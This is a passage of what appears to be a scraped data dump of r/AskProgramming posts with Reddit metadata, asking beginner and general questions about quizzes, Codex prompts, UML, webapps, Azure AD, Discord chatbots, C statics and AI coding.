+Wanted to attach image of my vision of the project but subreddit said ""no""",t2_58i46oy1,False,0,False,Study Quiz,r/AskProgramming,False,6,,0,False,t3_111dpf9,False,dark,0.8,public,3,0,False,False,False,,False,3,False,False,self,0.0,,True,1676306737.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Hello. &quot;New&quot; programmer here. Been programming in a C++, C# and JAVA, but that&#39;s already not a truth. I wanna get back in programming, perhaps with different language.</p>
+
+<p>Anyways, I&#39;m a volunteer fireman and I&#39;m kind of a newbie but I want to be better as a programmer and also as a fireman. So I thought, what if I (with some help of others) made for me, and some who want, this &quot;Quiz&quot;. Perhaps in Windows forms, so I can use images.</p>
+
+<p>Anyone mind helping a bit with this? Haven&#39;t programmed for a while now and I don&#39;t want to search forums for something I can get answer In seconds and at the right thing I need</p>
+
+<p>Wanted to attach image of my vision of the project but subreddit said &quot;no&quot;</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,,False,False,False,False,t5_2seko,False,,111dpf9,True,2,True,all_ads,False,False,/r/AskProgramming/comments/111dpf9/study_quiz/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/111dpf9/study_quiz/,93779,1676306737.0,0,False,False
+2048,confidence,"Hi, I want to use the codex api to improve my code. Rather than writing it out, I want codex to say how it should improve the code (e.g, rename x to y). I want to know the prompt I should write in order to get this kind of behavior. Thanks!!",t2_t3523qa0,False,0,False,How to ask codex to state how to improve my code,r/AskProgramming,False,6,,0,False,t3_1149b9c,False,dark,0.67,public,1,0,False,False,False,,False,1,False,False,self,0.0,,True,1676603990.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Hi, I want to use the codex api to improve my code. Rather than writing it out, I want codex to say how it should improve the code (e.g, rename x to y). I want to know the prompt I should write in order to get this kind of behavior. Thanks!!</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,1149b9c,True,1,True,all_ads,False,False,/r/AskProgramming/comments/1149b9c/how_to_ask_codex_to_state_how_to_improve_my_code/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/1149b9c/how_to_ask_codex_to_state_how_to_improve_my_code/,93779,1676603990.0,0,False,False
+2048,confidence,"Hey everyone,
+
+I recently gave a training on UML for my company and it got me thinking about the potential uses for this powerful tool beyond just documentation. One idea I shared with my team was using UML for planning and user experience design.
+
+I believe that by visually mapping out the different components of a project and how they interact, it can provide valuable insights into the user journey and make for a more seamless experience. Has anyone else tried using UML in this way? I'd love to hear about your experiences and any tips you may have.
+
+Thanks!",t2_meuyu2fi,False,0,False,Exploring the Benefits of Using UML for UX Design and Planning,r/AskProgramming,False,6,,0,False,t3_10mlnp0,False,dark,0.67,public,1,0,False,False,False,Other,False,1,False,False,self,0.0,,True,1674828393.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Hey everyone,</p>
+
+<p>I recently gave a training on UML for my company and it got me thinking about the potential uses for this powerful tool beyond just documentation. One idea I shared with my team was using UML for planning and user experience design.</p>
+
+<p>I believe that by visually mapping out the different components of a project and how they interact, it can provide valuable insights into the user journey and make for a more seamless experience. Has anyone else tried using UML in this way? I&#39;d love to hear about your experiences and any tips you may have.</p>
+
+<p>Thanks!</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,10mlnp0,True,3,True,all_ads,False,False,/r/AskProgramming/comments/10mlnp0/exploring_the_benefits_of_using_uml_for_ux_design/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10mlnp0/exploring_the_benefits_of_using_uml_for_ux_design/,93779,1674828393.0,0,False,False
+2048,confidence,"**First, a little bit about my ""coding"" background:**
+
+1. I know very basic html -- enough to create simple objects and be able to use snippets.
+
+2. I know ultra basic java -- classes, data types, etc.
+
+3. I'm an expert user of an in-house low-level programming tool based in java that my company uses.
+
+
+**I'm trying to create two things:**
+
+1. A webapp that outputs a string in either a textbox or a downloadable txt file based on user input. Ex. My name is VARIABLE1. I'm VARIABLE2. VARIABLE1 would be replaced by a text user input where as variable two would be replaced by a checkbox.
+
+2. A webapp that can take and save userinput, then run that userinput in the command prompt when a button is pressed on the webpage's webapp.
+
+
+**What I'm looking for:** 
+
+1. Either a no-code webapp tool where I can do this or a place where I can learn the related html code to be able to do this on my own.
+
+
+Any input is greatly appreciated",t2_l6h3frm,False,0,False,Beginner - Looking for a Tool or Resource for a Webapp,r/AskProgramming,False,6,,0,False,t3_10mlfkg,False,dark,1.0,public,2,0,False,False,False,HTML/CSS,False,2,False,False,self,0.0,,True,1674827815.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p><strong>First, a little bit about my &quot;coding&quot; background:</strong></p>
+
+<ol>
+<li><p>I know very basic html -- enough to create simple objects and be able to use snippets.</p></li>
+<li><p>I know ultra basic java -- classes, data types, etc.</p></li>
+<li><p>I&#39;m an expert user of an in-house low-level programming tool based in java that my company uses.</p></li>
+</ol>
+
+<p><strong>I&#39;m trying to create two things:</strong></p>
+
+<ol>
+<li><p>A webapp that outputs a string in either a textbox or a downloadable txt file based on user input. Ex. My name is VARIABLE1. I&#39;m VARIABLE2. VARIABLE1 would be replaced by a text user input where as variable two would be replaced by a checkbox.</p></li>
+<li><p>A webapp that can take and save userinput, then run that userinput in the command prompt when a button is pressed on the webpage&#39;s webapp.</p></li>
+</ol>
+
+<p><strong>What I&#39;m looking for:</strong> </p>
+
+<ol>
+<li>Either a no-code webapp tool where I can do this or a place where I can learn the related html code to be able to do this on my own.</li>
+</ol>
+
+<p>Any input is greatly appreciated</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,32c4cd08-356a-11ec-8992-82b8f4072b46,False,False,False,False,t5_2seko,False,,10mlfkg,True,2,True,all_ads,False,False,/r/AskProgramming/comments/10mlfkg/beginner_looking_for_a_tool_or_resource_for_a/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10mlfkg/beginner_looking_for_a_tool_or_resource_for_a/,93779,1674827815.0,0,False,False
+2048,confidence,"Hi there,
+
+I am building an ASP.NET Core WebApp which uses AAD to authenticate users. I have three app roles defined in Azure (User, Manager, Administrator).
+
+Now I would like to query all users in the AD which have the Manager role assigned.
+
+I read about the Graph API, but I am not sure how to use it.",t2_1xtm70p,False,0,False,ASP.NET Core WebApp - List users by app role (AAD),r/AskProgramming,False,6,,0,False,t3_1050ece,False,dark,1.0,public,2,0,False,False,False,,False,2,False,False,self,0.0,,True,1673027063.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Hi there,</p>
+
+<p>I am building an ASP.NET Core WebApp which uses AAD to authenticate users. I have three app roles defined in Azure (User, Manager, Administrator).</p>
+
+<p>Now I would like to query all users in the AD which have the Manager role assigned.</p>
+
+<p>I read about the Graph API, but I am not sure how to use it.</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,,False,False,False,False,t5_2seko,False,,1050ece,True,6,True,all_ads,False,False,/r/AskProgramming/comments/1050ece/aspnet_core_webapp_list_users_by_app_role_aad/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/1050ece/aspnet_core_webapp_list_users_by_app_role_aad/,93779,1673027063.0,0,False,False
+2048,confidence,"But is there services to hire programmers to fix code. 
+Like if I gave them 3 or 4 different languages could they compile them together? Or make sense of what I was trying to accomplish? Or maybe even just rewrite the code better?",t2_pmj4f9h0,False,0,False,"Hi, not a programmer, and if I am Im technically just dipping my toes in the water",r/AskProgramming,False,6,,0,False,t3_103j4ba,False,dark,1.0,public,1,0,False,False,False,Other,False,1,False,False,self,0.0,,True,1672875848.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>But is there services to hire programmers to fix code. 
+Like if I gave them 3 or 4 different languages could they compile them together? Or make sense of what I was trying to accomplish? Or maybe even just rewrite the code better?</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,103j4ba,True,6,True,all_ads,False,False,/r/AskProgramming/comments/103j4ba/hi_not_a_programmer_and_if_i_am_im_technically/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/103j4ba/hi_not_a_programmer_and_if_i_am_im_technically/,93779,1672875848.0,0,False,False
+2048,confidence,"Hey there, I've always been interested in AI, chatbots, image generating and stuff like that. I've joined openai's trial for gpt-3 and made a chat bot using that and i loved how simple it was yet how amazing the result was too.  
+
+
+Although at one point the billing costs struck me and i had to drop the project. I like making bots on discord to have fun with friends and experiment with various things using node.js and discord.js.   
+I was wondering, would it be possible to teach an AI to generate text (a reply) when given a prompt (a new sent message) based on some context (the previous X amount of messages in the chat) ?  
+
+
+Pretty much the same way i got it to work with gpt3, but im not looking for something of that insane quality off the grid, but rather have something that could possibly build up, maybe even having a main file that it stores all messages in and adds on to that with each message, having more and more knowledge of what goes on at what times from what person and being able to interact accordingly.  
+
+
+If anyone knows where i'd have to look for this or if it's even remotely possible please let me know because i find this very fascinating and i'd love to spend my last weeks of summer trying to make it happen. Thanks in advance!",t2_lj6iapjf,False,0,False,Developing and training a chabot to implement on Discord,r/AskProgramming,False,6,,0,False,t3_x1luug,False,dark,1.0,public,1,0,False,False,False,Javascript,False,1,False,False,self,0.0,,True,1661872906.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Hey there, I&#39;ve always been interested in AI, chatbots, image generating and stuff like that. I&#39;ve joined openai&#39;s trial for gpt-3 and made a chat bot using that and i loved how simple it was yet how amazing the result was too.  </p>
+
+<p>Although at one point the billing costs struck me and i had to drop the project. I like making bots on discord to have fun with friends and experiment with various things using node.js and discord.js.<br/>
+I was wondering, would it be possible to teach an AI to generate text (a reply) when given a prompt (a new sent message) based on some context (the previous X amount of messages in the chat) ?  </p>
+
+<p>Pretty much the same way i got it to work with gpt3, but im not looking for something of that insane quality off the grid, but rather have something that could possibly build up, maybe even having a main file that it stores all messages in and adds on to that with each message, having more and more knowledge of what goes on at what times from what person and being able to interact accordingly.  </p>
+
+<p>If anyone knows where i&#39;d have to look for this or if it&#39;s even remotely possible please let me know because i find this very fascinating and i&#39;d love to spend my last weeks of summer trying to make it happen. Thanks in advance!</p>
+</div><!-- SC_ON -->",True,True,False,False,False,False,26314882-356a-11ec-b645-ba9d61e79147,False,False,False,False,t5_2seko,False,,x1luug,True,4,True,all_ads,False,False,/r/AskProgramming/comments/x1luug/developing_and_training_a_chabot_to_implement_on/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/x1luug/developing_and_training_a_chabot_to_implement_on/,93779,1661872906.0,0,False,False
+2048,confidence,"I have been using a lot of statics for variables in my projects and I'm starting to feel as If I'm abusing them. Am I? If so what is the best practice for creating global variables limited to the file?
+
+&#x200B;
+
+Example:
+
+static int count;
+
+static struct day\_t day;
+
+static bool exists;
+
+...
+
+&#x200B;
+
+void func()
+
+{
+
+//............................................}",t2_81e2vi6o,False,0,False,Abusing statics in C?,r/AskProgramming,False,6,,0,False,t3_zyoj5i,False,dark,1.0,public,1,0,False,False,False,,False,1,False,False,self,0.0,,True,1672367696.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I have been using a lot of statics for variables in my projects and I&#39;m starting to feel as If I&#39;m abusing them. Am I? If so what is the best practice for creating global variables limited to the file?</p>
+
+<p>&#x200B;</p>
+
+<p>Example:</p>
+
+<p>static int count;</p>
+
+<p>static struct day_t day;</p>
+
+<p>static bool exists;</p>
+
+<p>...</p>
+
+<p>&#x200B;</p>
+
+<p>void func()</p>
+
+<p>{</p>
+
+<p>//............................................}</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,zyoj5i,True,5,True,all_ads,False,False,/r/AskProgramming/comments/zyoj5i/abusing_statics_in_c/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/zyoj5i/abusing_statics_in_c/,93779,1672367696.0,0,False,False
+2048,confidence,,t2_enahczuh,False,0,False,What VCS do you use for Unity? Git?,r/AskProgramming,False,6,,0,False,t3_zdwcy4,False,dark,1.0,public,1,0,False,False,False,,False,1,False,False,self,0.0,,True,1670303664.0,text,6,text,self.AskProgramming,False,,False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,zdwcy4,True,4,True,all_ads,False,False,/r/AskProgramming/comments/zdwcy4/what_vcs_do_you_use_for_unity_git/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/zdwcy4/what_vcs_do_you_use_for_unity_git/,93779,1670303664.0,0,False,False
+2048,confidence,"# I don't know the first thing about coding, I'm completely ignorant, I mean no disrespect I'm only curious
+
+I think we've all noticed the sheer acceleration of AI technology, I think Stable Diffusion for AI generated images was released this year and not long after we already are getting versions of it that can now do animations. Honestly, I think the rate of growth is pretty scary I was not expecting to see something like this and I just sit and think about it every now and then.
+
+That got me thinking, I know programming goes into UI and (I think) UI is essentially an image with moving parts that can be linked to databases, the internet, etc. you interact with it the same way as you would with the source code but it's pretty and clickable as to not confuse our non-coding smooth and simple brains. So just how you can prompt the SD AI to generate images with simple phrases like:
+
+\-do a building
+
+\-make it pointy
+
+\-no not so pointy
+
+\-perfect, now add Amy Winehouse swinging from a wrecking ball
+
+Why wouldn't it be possible to do the same with coding? And I mean since it's ""just images"", couldn't the AI not even have to actually write any new code? Like say you had the Reddit website but instead of all the elements being written in code somewhere, it's just an interact-able image and when you request something, say you click on a post, instead of the website running something to get it the AI just goes and gets it and shows it to you. Why couldn't you make a website with prompts like:
+
+\-Add some tabs titled ""shop; contact; support; Yo mama jokes""
+
+\-Add a dark backdrop
+
+\-Syncronize the shop items tab with the excel file ""shop items""
+
+\-Add shopping cart
+
+\-Add animation to buttons
+
+And lets say that this implementation for websites would be ""easier"" since you have website building websites with pre-made elements and you could build off that (I don't know if you can I'm just saying) why couldn't this principle or idea work for other forms of coding that aren't necessarily tied to UI, say back-end related activities that I know nothing about, idk what you guys get up to back there.
+
+I know I'm coming off as really ignorant right about now probably, tbh I'm just watching how slowly but surely my job is gonna be inevitably replaced by some devs writing some ones and zeroes in a computer and I'm just wondering if y'all are planning your own obsolescence or if you're just fucking with us. (THAT WAS A JOKE, not serious)
+
+Thanks for reading, I appreciate any and all answers",t2_ayw8rv7i,False,0,False,Could an AI do coding?,r/AskProgramming,False,6,,0,False,t3_ybahmn,False,dark,0.5,public,0,0,False,False,False,Other,False,0,False,False,self,0.0,,True,1666507586.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><h1>I don&#39;t know the first thing about coding, I&#39;m completely ignorant, I mean no disrespect I&#39;m only curious</h1>
+
+<p>I think we&#39;ve all noticed the sheer acceleration of AI technology, I think Stable Diffusion for AI generated images was released this year and not long after we already are getting versions of it that can now do animations. Honestly, I think the rate of growth is pretty scary I was not expecting to see something like this and I just sit and think about it every now and then.</p>
+
+<p>That got me thinking, I know programming goes into UI and (I think) UI is essentially an image with moving parts that can be linked to databases, the internet, etc. you interact with it the same way as you would with the source code but it&#39;s pretty and clickable as to not confuse our non-coding smooth and simple brains. So just how you can prompt the SD AI to generate images with simple phrases like:</p>
+
+<p>-do a building</p>
+
+<p>-make it pointy</p>
+
+<p>-no not so pointy</p>
+
+<p>-perfect, now add Amy Winehouse swinging from a wrecking ball</p>
+
+<p>Why wouldn&#39;t it be possible to do the same with coding? And I mean since it&#39;s &quot;just images&quot;, couldn&#39;t the AI not even have to actually write any new code? Like say you had the Reddit website but instead of all the elements being written in code somewhere, it&#39;s just an interact-able image and when you request something, say you click on a post, instead of the website running something to get it the AI just goes and gets it and shows it to you. Why couldn&#39;t you make a website with prompts like:</p>
+
+<p>-Add some tabs titled &quot;shop; contact; support; Yo mama jokes&quot;</p>
+
+<p>-Add a dark backdrop</p>
+
+<p>-Syncronize the shop items tab with the excel file &quot;shop items&quot;</p>
+
+<p>-Add shopping cart</p>
+
+<p>-Add animation to buttons</p>
+
+<p>And lets say that this implementation for websites would be &quot;easier&quot; since you have website building websites with pre-made elements and you could build off that (I don&#39;t know if you can I&#39;m just saying) why couldn&#39;t this principle or idea work for other forms of coding that aren&#39;t necessarily tied to UI, say back-end related activities that I know nothing about, idk what you guys get up to back there.</p>
+
+<p>I know I&#39;m coming off as really ignorant right about now probably, tbh I&#39;m just watching how slowly but surely my job is gonna be inevitably replaced by some devs writing some ones and zeroes in a computer and I&#39;m just wondering if y&#39;all are planning your own obsolescence or if you&#39;re just fucking with us. (THAT WAS A JOKE, not serious)</p>
+
+<p>Thanks for reading, I appreciate any and all answers</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,ybahmn,True,13,True,all_ads,False,False,/r/AskProgramming/comments/ybahmn/could_an_ai_do_coding/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/ybahmn/could_an_ai_do_coding/,93779,1666507586.0,0,False,False
